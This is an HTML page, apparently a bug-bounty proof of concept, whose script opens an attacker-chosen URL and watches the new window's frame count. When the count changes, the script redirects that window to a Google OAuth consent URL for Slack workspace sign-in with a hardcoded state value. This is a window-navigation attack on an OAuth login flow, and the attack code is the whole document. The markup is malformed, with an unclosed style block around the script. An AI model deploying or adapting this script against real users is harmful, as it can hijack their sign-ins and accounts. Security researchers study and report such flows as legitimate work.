<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            display: flex;

<script>
  // Get the URL parameter
    function getParameterByName(name, targetURL) {
        if (!targetURL) targetURL = window.location.href;
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(targetURL);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, " "));
    }
let foo;
    let baselength;
    var urlParam = getParameterByName('targetURL');
    function init() {
        baselength = foo.length;
        console.log("Setting base to " + baselength);       
        watch();
    }
    function watch() {
        if (foo.length != baselength) {
            console.log("baselength: " + baselength);
            console.log("foo.length " + foo.length);
            console.log('Google navigation');
            foo.location.href = "https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?client_id=606092904014-s1u3idjanlbhr4ns5b1hcjgfn63cr9nh.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Foauth2.slack.com%2Fworkspace-signin%2Foauth%2Fgoogle%2Fend&scope=openid%20email%20profile&response_type=code&access_type=offline&state=%7B%22provider%22%3A%22google%22%2C%22origin%22%3A%22workspace-signin%22%2C%22timestamp%22%3A1739931462%2C%22visitor%22%3A%22.f20f3df868470982db89b2e2a6cad024%22%2C%22team%22%3A%22T1LF379D0%22%7D%7Cd0c59a20e629fff65b7fa28649f20b355f80575d17a2fefa49c4a1141e485bb2&prompt=consent&service=lso&o2v=2&ddm=1&flowName=GeneralOAuthFlow";
        }else{
            console.log("watch(): " + foo.length  + " / " + baselength);
            setTimeout(watch,1);
        }
    }
    function launch(){
        foo = window.open(urlParam, "foo", "");
        setTimeout(init,1200);
    }
    launch();
</script>

</head>
<body>
    <img src="https://github.com/h4nt3rx/hunter/blob/site/pwh.png">
